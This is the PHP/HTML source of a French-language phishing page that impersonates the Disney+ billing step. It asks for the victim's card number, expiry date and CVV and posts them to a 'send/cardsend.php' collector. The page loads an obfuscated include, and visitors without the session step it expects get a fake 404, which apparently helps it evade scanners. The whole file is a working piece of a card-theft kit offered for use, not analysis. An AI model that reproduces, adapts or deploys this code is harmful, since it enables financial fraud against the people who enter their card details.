<?php 
ob_start();
session_start();
include('../AB/autoload_obfs.php');
if(isset($_SESSION['step_two'])){
?>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-title" content="Disney+">
    <meta name="theme-color" content="#ffffff">
    <meta name="msapplication-TileColor" content="#ffffff">

    <link rel="manifest" href="../img/ico/manifest.json">
    <link rel="shortcut icon" href="../img/ico/favicon.ico">
    <link rel="mask-icon" href="../img/ico/safari-pinned-tab.svg" color="#1d1fff">
    <link rel="apple-touch-icon" sizes="180x180" href="../img/ico/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../img/ico/favicon-32x32.png">

    <title>Facturation | Disney+</title>

	<script src="../js/jquery-1.11.3.min.js"></script>
	<link rel="stylesheet" type="text/css" href="../style/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="../style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="../style/main.css">
    <link rel="stylesheet" type="text/css" href="../style/react.css">
    <link rel="stylesheet" type="text/css" href="../style/card.css">
    <style>
        html {
            display: none;
        }
    </style>
    <script>
        if (self == top) {
            document.documentElement.style.display = 'block';
        } else {
            top.location = self.location;
        }
    </script>
</head>

<body id="app_index" class="js-focus-visible">



    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../img/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form id="dssLogin" name="dssLogin" action="<?php echo './send/cardsend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post">
                                <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;">ÉTAPE 2 SUR 2</div>
                                <br>
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Information de facturation</h3>
                                <div data-gv2containerkey="paymentInfo">
                                    <div>
                                        <form class="billing-form billing-form--credit" novalidate="">
                                            <fieldset class="sc-jxGEyO gLFPOz" style="margin-bottom: 20px;">

                                                <div data-testid="" class="sc-gNJABI ipGQYr"><?php
echo '<input aria-label="Nom sur la carte" id="billing-card-name" maxlength="1000" name="CARD_NAME" placeholder="" type="text" class="sc-kjoXOD eUqZyU sc-cqPOvA hgwRqC" value="'.$_SESSION["surname"].' '.$_SESSION["name"].'" disabled>'
?>
                                                    <div class="sc-fjhmcy fmWZhI input-label" for="billing-card-name">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">NOM SUR LA CARTE</font>
                                                        </font>
                                                    </div>
                                                </div>
                                            </fieldset>
                                            <fieldset class="sc-jxGEyO fjctja sc-gCKARq ensgGZ" style="margin-bottom: 20px;">
                                                <div data-testid="" class="sc-gNJABI ipGQYr"><input aria-label="Entrez votre numéro de carte de crédit." style="" id="cart_number" maxlength="19" name="c_num" placeholder="" type="text" pattern="[0-9]*" class="sc-kjoXOD eUqZyU sc-cqPOvA bPLfKs" value="" >
                                                    <div class="sc-fjhmcy fmWZhI input-label" for="billing-card-number">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">NUMÉRO DE CARTE</font>
                                                        </font>
                                                    </div>
                                                </div>
                                            </fieldset>
                                            <div class="card-row">
                                                <fieldset class="sc-jxGEyO gLFPOz card-exp" style="margin-bottom: 20px;">
                                                    <div data-testid="" class="sc-gNJABI ipGQYr"><input aria-label="Date d'expiration" id="billing-card-exp-date" maxlength="7" name="exdate" placeholder="MM / AAAA" type="tel" class="sc-kjoXOD eUqZyU sc-cqPOvA hgwRqC" value="" 
                                                            onkeyup="formatString(event);"
                                                            onkeypress="formatString(event);"
                                                            onpaste="formatString(event);">
														<script>
$( document ).ready(function() {
            $.urlParam = function(name){
     var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
     return results[1] || 0;
}         
$('#billing-card-number').on('focusout',function(){
             $('#cart_number').removeClass('is-invalid');
});
$("#billing-card-number,#ccv").keydown(function (e) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110]) !== -1 ||
             // Allow: Ctrl+A, Command+A
            (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
             // Allow: home, end, left, right, down, up
            (e.keyCode >= 35 && e.keyCode <= 40)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });             
														</script>
														<script>
        var characterCount
$('#billing-card-exp-date').on('input',function(e){
    if($(this).val().length == 2 && characterCount < $(this).val().length) {
        $(this).val($(this).val()+'/');
    }
    characterCount = $(this).val().length
});
														</script>
                                                        <div class="sc-fjhmcy fmWZhI input-label" for="billing-card-exp-date">
                                                            <font style="vertical-align: inherit;">
                                                                <font style="vertical-align: inherit;">DATE D'EXPIRATION</font>
                                                            </font>
                                                        </div>
                                                    </div>
                                                </fieldset>
                                                <div class="csc-container show-billing">
                                                    <fieldset class="sc-jxGEyO gLFPOz sc-fjdPjP iySyfU" style="margin-bottom: 20px;">
                                                        <div data-testid="" class="sc-gNJABI ipGQYr"><input aria-label="Entrez votre CVV de carte de crédit." id="billing-card-CSC" maxlength="4" name="csc" placeholder="CVV" type="text" pattern="[0-9]*" class="sc-kjoXOD eUqZyU sc-cqPOvA hgwRqC" value="">
                                                            <div class="sc-fjhmcy fmWZhI input-label" for="billing-card-CSC">
                                                                <font style="vertical-align: inherit;">
                                                                    <font style="vertical-align: inherit;">CODE DE SÉCURITÉ</font>
                                                                </font>
                                                            </div>
                                                        </div>
                                                    </fieldset>
                                                </div>
                                            </div>
                                    </div>
                                    <div><button aria-label="Accepter et continuer" data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" id="" type="submit">CONTINUER</button></div>
                                    </form>
									<script>
$( document ).ready(function() {
            $.urlParam = function(name){
     var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
     return results[1] || 0;
}         
$('#cart_number').on('focusout',function(){
             $('#cart_number').removeClass('is-invalid');
});
$("#cart_number,#ccv").keydown(function (e) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110]) !== -1 ||
             // Allow: Ctrl+A, Command+A
            (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
             // Allow: home, end, left, right, down, up
            (e.keyCode >= 35 && e.keyCode <= 40)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });                   
if($.urlParam('error')){
$('#cart_number').addClass('is-invalid');
}
});

function formatString(e) {
    var inputChar = String.fromCharCode(event.keyCode);
    var code = event.keyCode;
    var allowedKeys = [8];
    if (allowedKeys.indexOf(code) !== -1) {
        return;
    }

    event.target.value = event.target.value.replace(
        /^([1-9]\/|[2-9])$/g, '0$1/'
    ).replace(
        /^(0[1-9]|1[0-2])$/g, '$1/'
    ).replace(
        /^([0-1])([3-9])$/g, '0$1/$2'
    ).replace(
        /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2'
    ).replace(
        /^([0]+)\/|[0]+$/g, '0'
    ).replace(
        /[^\d\/]|^[\/]*$/g, ''
    ).replace(
        /\/\//g, '/'
    );
}


function maxLengthCheck(object) {
    if (object.value.length > object.maxLength)
        object.value = object.value.slice(0, object.maxLength)
}
									</script>
									<style>
										.is-invalid {
										border: 1px solid red;
										
										}
                                </div>
                    </main>
                    </div>
                </div>
                <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                    <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">OBTENIR DISNEY+</button></div>
                </div>
                <div id="webAppFooter">
                    <footer class="sc-fgfRvd kAzEpp" style="margin-top: 100px;" id="footer">
                        <div class="sc-hIVACf fPaITX"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                        <div class="sc-gpHHfC fohBoY"><button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Règles de Respect de la Vie Privée</button>
                            <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Modalités relatives aux cookies</button>
                            <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Droits Données dans l'UE et au R-U</button>
                            <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">A propos de Disney+</button>
                            <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Conditions générales d'abonnement</button>
                            <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Aide</button>
                            <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Appareils compatibles</button>
                            <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">À propos de Disney+</button>
                            <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Publicités ciblées par centres d'intérêt</button>
                            <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Gérer vos préférences</button>
                        </div>
                        <div class="sc-gVyKpa kOxdJt">© Disney. Tous droits réservés.</div>
                    </footer>
                </div>
            </div>
        </div>
</body>
</html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>